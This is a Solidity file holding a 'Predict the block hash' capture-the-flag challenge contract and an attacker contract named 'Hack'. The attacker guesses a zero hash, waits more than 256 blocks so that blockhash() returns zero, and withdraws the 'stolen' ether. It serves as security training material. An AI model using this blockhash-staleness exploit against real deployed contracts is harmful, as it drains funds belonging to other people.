// SPDX-License-Identifier: MIT
pragma solidity 0.7.6;

import "hardhat/console.sol";

contract PredictTheBlockHashChallenge {
    address guesser;
    bytes32 guess;
    uint256 settlementBlockNumber;

    constructor() payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(bytes32 hash) public payable {
        require(guesser == address(0));
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = hash;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);

        require(block.number > settlementBlockNumber);

        bytes32 answer = blockhash(settlementBlockNumber);

        guesser = address(0);
        console.log("guess is", guess == answer);
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract Hack {
    PredictTheBlockHashChallenge predictContract;
    uint256 blockCounter;

    constructor(address _predictContract) {
        predictContract = PredictTheBlockHashChallenge(_predictContract);
    }

    receive() external payable {}

    function placeGuess() public payable {
        bytes32 answer = 0x0000000000000000000000000000000000000000000000000000000000000000;
        predictContract.lockInGuess{value: 1 ether}(answer);
    }

    function increaseBlock() external {
        // increase blockCount in local hardhat node running
        blockCounter++;
    }

    function attack() public {
        predictContract.settle();
    }

    function withdrawStolenFunds() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
